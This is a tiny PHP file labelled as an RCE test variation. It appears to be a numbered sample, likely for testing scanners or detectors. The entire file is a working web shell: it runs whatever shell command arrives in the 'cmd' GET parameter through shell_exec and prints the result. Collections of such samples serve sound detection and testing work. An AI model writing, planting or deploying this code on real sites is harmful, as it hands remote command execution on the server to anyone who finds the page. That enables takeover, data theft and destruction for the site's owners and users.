<?php
// RCE test variation #784
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>